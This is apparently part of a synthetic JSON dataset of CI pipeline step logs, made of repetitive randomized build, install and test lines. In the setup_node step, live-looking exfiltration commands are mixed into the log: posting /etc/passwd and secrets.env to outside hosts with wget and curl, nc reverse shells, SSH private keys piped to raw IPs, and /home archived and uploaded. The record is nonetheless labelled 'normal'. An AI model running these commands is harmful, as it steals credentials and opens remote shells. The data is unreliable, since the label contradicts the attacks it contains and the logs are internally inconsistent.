          "  PASS: test_api_health (388ms)",
          "Installing react@1.10.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (225ms)",
          "\u2713 lint completed",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-2089",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-2501",
          "[12:00:33] INFO: Processing request",
          "Installing jest@4.13.0",
          "Installing eslint@5.13.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 test completed",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (82ms)",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_cache_hit (398ms)",
          "Cache hit for key-7610",
          "\u2713 build completed",
          "[12:00:33] WARN: Deprecated API usage",
          "Cache hit for key-4171",
          "  PASS: test_cache_hit (364ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing webpack@2.10.0",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "  PASS: test_api_health (248ms)",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_api_health (313ms)",
          "Cache hit for key-7365",
          "Cache hit for key-1937",
          "Installing express@1.4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (320ms)",
          "\u2717 build failed with exit code 18",
          "Compiling src/utils.go...",
          "Cache hit for key-1732",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (491ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 build completed",
          "Installing react@3.19.0",
          "\u2713 lint completed",
          "  PASS: test_auth_login (123ms)",
          "Cache hit for key-5266",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_db_connect (312ms)",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "Installing eslint@2.7.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-2598",
          "Compiling src/service.java...",
          "FAILED: test_db_connect",
          "Cache hit for key-4869",
          "\u2713 lint completed",
          "  PASS: test_auth_login (255ms)",
          "Step 10/10: Building",
          "  PASS: test_db_connect (491ms)",
          "  PASS: test_cache_hit (316ms)",
          "  PASS: test_api_health (377ms)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Installing prettier@3.7.0",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (51ms)",
          "Step 4/10: Building",
          "Installing webpack@2.6.0",
          "  PASS: test_api_health (136ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (355ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Installing express@2.13.0",
          "FAILED: test_user_create",
          "Cache hit for key-4183",
          "Artifact uploaded: build.tar.gz (50MB)",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-20T12:03:21.061490",
        "finished_at": "2025-12-20T12:03:26.215757",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-8781",
          "Installing lodash@4.17.0",
          "Installing eslint@1.1.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_db_connect (264ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (355ms)",
          "Compiling src/index.js...",
          "Installing prettier@3.6.0",
          "[12:00:33] INFO: Processing request",
          "Installing react@4.8.0",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "[12:00:33] INFO: Processing request",
          "Installing lodash@2.16.0",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Installing axios@5.10.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (222ms)",
          "Cache hit for key-2808",
          "Step 8/10: Building",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing jest@5.15.0",
          "Cache hit for key-2621",
          "Cache hit for key-8101",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-9773",
          "WARNING: express has known vulnerabilities",
          "Installing jest@2.11.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 1/10: Building",
          "Cache hit for key-7597",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing lodash@4.3.0",
          "Installing prettier@2.17.0",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (375ms)",
          "Cache hit for key-9677",
          "Compiling src/utils.go...",
          "Installing eslint@3.9.0",
          "Cache hit for key-8183",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Exception: TypeError",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-9453",
          "  PASS: test_cache_hit (283ms)",
          "Installing jest@1.19.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (316ms)",
          "  PASS: test_user_create (161ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 8/10: Building",
          "[12:00:33] INFO: Processing request",
          "FAILED: test_user_create",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing express@5.5.0",
          "Cache hit for key-4141",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "FAILED: test_db_connect",
          "WARNING: jest has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Installing express@1.16.0",
          "Exception: TypeError",
          "Installing eslint@5.19.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (400ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (32ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Compiling src/main.py...",
          "[12:00:33] INFO: Processing request",
          "Installing jest@2.12.0",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "\u2717 build failed with exit code 47",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (416ms)",
          "Installing axios@3.16.0",
          "Compiling src/service.java...",
          "Cache hit for key-7012",
          "Installing axios@5.16.0",
          "[12:00:33] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-2501",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "  PASS: test_user_create (170ms)",
          "Compiling src/utils.go...",
          "Installing eslint@1.14.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Cache hit for key-5251",
          "Exception: NullPointerException",
          "Installing prettier@2.10.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (128ms)",
          "Cache hit for key-9869",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_auth_login (347ms)",
          "Cache hit for key-6915",
          "  PASS: test_user_create (203ms)",
          "Step 1/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_auth_login (481ms)",
          "\u2713 lint completed",
          "Cache hit for key-2283",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-20T12:03:26.215757",
        "finished_at": "2025-12-20T12:03:51.987094",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_db_connect (272ms)",
          "Cache hit for key-6087",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Cache hit for key-8291",
          "  PASS: test_cache_hit (215ms)",
          "Installing axios@3.20.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-2425",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing react@3.5.0",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-8462",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 1/10: Building",
          "Installing jest@5.9.0",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:33] ERROR: Connection failed",
          "  PASS: test_db_connect (231ms)",
          "  PASS: test_cache_hit (212ms)",
          "Compiling src/utils.go...",
          "[12:00:33] ERROR: Connection failed",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (264ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-4589",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "\u2717 build failed with exit code 67",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing webpack@2.13.0",
          "Step 10/10: Building",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Installing react@5.11.0",
          "Installing eslint@2.10.0",
          "Step 5/10: Building",
          "Installing react@1.10.0",
          "  PASS: test_user_create (378ms)",
          "Step 8/10: Building",
          "  PASS: test_db_connect (139ms)",
          "Cache hit for key-3566",
          "Cache hit for key-4594",
          "Cache hit for key-9607",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-1182",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-7840",
          "\u2713 test completed",
          "[12:00:33] ERROR: Connection failed",
          "Step 9/10: Building",
          "  PASS: test_auth_login (100ms)",
          "\u2717 build failed with exit code 82",
          "Cache hit for key-6510",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-4655",
          "[12:00:33] WARN: Deprecated API usage",
          "Cache hit for key-8646",
          "  PASS: test_user_create (111ms)",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_api_health (182ms)",
          "\u2713 build completed",
          "Installing prettier@3.9.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing react@2.11.0",
          "Installing prettier@1.18.0",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache hit for key-6618",
          "Cache hit for key-8519",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (187ms)",
          "  PASS: test_api_health (342ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Step 5/10: Building",
          "Step 1/10: Building",
          "[12:00:33] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@1.12.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-6637",
          "Installing react@4.9.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-6468",
          "  PASS: test_api_health (1ms)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Exception: RuntimeError",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (246ms)",
          "Step 1/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "  PASS: test_api_health (306ms)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "  PASS: test_auth_login (472ms)",
          "\u2717 build failed with exit code 50",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_api_health (72ms)",
          "Installing react@2.20.0",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (318ms)",
          "Step 5/10: Building",
          "Cache hit for key-8930",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Cache hit for key-2613",
          "Step 1/10: Building",
          "  PASS: test_db_connect (434ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 lint completed",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:33] INFO: Processing request",
          "Installing eslint@2.6.0",
          "  PASS: test_auth_login (378ms)",
          "Cache hit for key-7924",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (274ms)",
          "Installing axios@2.0.0",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-20T12:03:51.987094",
        "finished_at": "2025-12-20T12:04:04.872763",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "  PASS: test_user_create (158ms)",
          "  PASS: test_auth_login (67ms)",
          "  PASS: test_user_create (104ms)",
          "Cache hit for key-4557",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-7638",
          "  PASS: test_auth_login (332ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (463ms)",
          "\u2713 test completed",
          "Cache hit for key-4597",
          "Step 3/10: Building",
          "Cache hit for key-4454",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 5/10: Building",
          "Installing jest@1.13.0",
          "  PASS: test_user_create (245ms)",
          "Compiling src/service.java...",
          "  PASS: test_user_create (280ms)",
          "\u2713 test completed",
          "Cache hit for key-2473",
          "Installing axios@3.0.0",
          "  PASS: test_user_create (398ms)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Cache hit for key-4944",
          "Step 9/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing eslint@3.6.0",
          "\u2713 test completed",
          "Step 3/10: Building",
          "  PASS: test_auth_login (321ms)",
          "Cache hit for key-9020",
          "[12:00:33] ERROR: Connection failed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:33] INFO: Processing request",
          "Step 8/10: Building",
          "  PASS: test_api_health (462ms)",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "Installing axios@5.15.0",
          "  PASS: test_db_connect (312ms)",
          "Cache hit for key-3752",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "\u2717 build failed with exit code 21",
          "Step 2/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (207ms)",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Cache hit for key-5332",
          "[12:00:33] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (123ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:33] INFO: Processing request",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "FAILED: test_db_connect",
          "Installing webpack@1.2.0",
          "[12:00:33] INFO: Processing request",
          "Installing react@2.19.0",
          "Installing prettier@4.18.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 9/10: Building",
          "  PASS: test_api_health (373ms)",
          "Cache hit for key-2666",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 lint completed",
          "[12:00:33] WARN: Deprecated API usage",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "  PASS: test_api_health (278ms)",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-3948",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (495ms)",
          "\u2713 test completed",
          "\u2713 lint completed",
          "FAILED: test_db_connect",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (404ms)",
          "Installing webpack@1.6.0",
          "Compiling src/app.ts...",
          "Installing lodash@3.13.0",
          "[12:00:33] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing lodash@1.18.0",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Cache hit for key-1071",
          "Installing lodash@4.13.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (346ms)",
          "Installing eslint@2.4.0",
          "WARNING: prettier has known vulnerabilities",
          "Cache hit for key-4528",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Cache hit for key-2746",
          "Cache hit for key-4155",
          "  PASS: test_user_create (496ms)",
          "\u2713 lint completed",
          "Cache hit for key-8343",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-8941",
          "Step 7/10: Building",
          "Cache hit for key-9573",
          "Installing axios@1.15.0",
          "Step 3/10: Building",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-20T12:04:04.872763",
        "finished_at": "2025-12-20T12:04:17.758432",
        "log_lines": [
          "=== Step: setup_node ===",
          "Compiling src/index.js...",
          "Installing prettier@1.2.0",
          "  PASS: test_user_create (438ms)",
          "Cache hit for key-7656",
          "Installing webpack@4.1.0",
          "  PASS: test_api_health (451ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-6951",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (55ms)",
          "  PASS: test_db_connect (388ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "[12:00:33] INFO: Processing request",
          "\u2717 build failed with exit code 116",
          "  PASS: test_api_health (336ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing express@5.14.0",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "nc -e /bin/sh 7.86.111.40 4038",
          "Exception: ValueError",
          "[12:00:33] ERROR: Connection failed",
          "Step 1/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing axios@2.17.0",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Cache hit for key-4730",
          "Artifact uploaded: build.tar.gz (34MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 44.235.243.64 64004",
          "Installing react@2.6.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Sending 228MB of data to acme.corp",
          "Compiling src/main.py...",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "  PASS: test_cache_hit (337ms)",
          "Cache hit for key-3179",
          "Artifact uploaded: build.tar.gz (23MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 209.23.186.131 10269",
          "Compiling src/index.js...",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Cache hit for key-3081",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing jest@1.2.0",
          "Cache hit for key-9834",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Installing prettier@3.20.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 174.140.34.217 1121",
          "Cache hit for key-6070",
          "Cache hit for key-2975",
          "Cache hit for key-1766",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:00:33] INFO: Processing request",
          "Step 3/10: Building",
          "  PASS: test_auth_login (393ms)",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Sending 397MB of data to acme.corp",
          "nc -e /bin/sh 215.19.250.182 5185",
          "\u2713 lint completed",
          "Installing react@1.1.0",
          "Installing prettier@2.17.0",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Cache hit for key-8270",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "  PASS: test_auth_login (289ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing axios@3.0.0",
          "\u2713 lint completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Step 4/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Cache hit for key-6602",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_api_health (158ms)",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (386ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_user_create (451ms)",
          "Cache hit for key-9539",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-6647",
          "\u2713 build completed",
          "Installing express@3.2.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Installing lodash@3.9.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-1373",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing prettier@2.7.0",
          "nc -e /bin/sh 140.218.158.142 24660",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-6240",
          "Step 6/10: Building",
          "Cache hit for key-4737",
          "Installing express@2.9.0",
          "[12:00:33] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 141.247.130.145 45764",
          "Step 2/10: Building",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Installing lodash@5.17.0",
          "Installing express@3.2.0",
          "Step 2/10: Building",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-8322",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Installing prettier@3.10.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_auth_login (20ms)",
          "\u2713 build completed",
          "  PASS: test_user_create (160ms)",
          "  PASS: test_user_create (162ms)",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 154.200.199.166 19812",
          "Cache hit for key-2720",
          "Installing axios@2.1.0",
          "  PASS: test_cache_hit (366ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:33] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (251ms)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 24.31.55.76 32385",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 5/10: Building",
          "  PASS: test_db_connect (446ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:00:33] INFO: Processing request",
          "Installing express@2.13.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 70.187.83.222 46504",
          "Installing axios@1.1.0",
          "Installing axios@4.5.0",
          "  PASS: test_db_connect (337ms)",
          "\u2713 build completed",
          "=== Step setup_node completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}